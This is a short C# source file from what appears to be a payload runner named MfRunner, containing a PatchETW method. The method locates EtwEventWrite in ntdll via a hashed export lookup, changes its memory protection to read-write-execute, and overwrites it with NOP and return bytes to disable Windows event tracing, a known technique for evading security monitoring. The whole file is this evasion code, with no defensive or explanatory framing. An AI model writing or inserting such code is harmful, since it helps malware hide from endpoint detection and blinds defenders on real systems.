using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
        public static void PatchETW()
        {
            IntPtr EtwEventWriteAddress = GetExportAddress(NtdllAddress, 0x695BAB02);
            if (EtwEventWriteAddress == IntPtr.Zero)
                return;

            byte[] EtwPatchBytes = new byte[] { 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 195 };
            ApplyRC4(EtwPatchBytes, DeriveKey(SEED_ETW_PATCH));

            uint OldProtect = 0;
            if (CustomVirtualProtect(EtwEventWriteAddress, (UIntPtr)EtwPatchBytes.Length, 0x40, out OldProtect))
            {
                CopyFunction(EtwEventWriteAddress, EtwPatchBytes);
            }
        }
    }
}
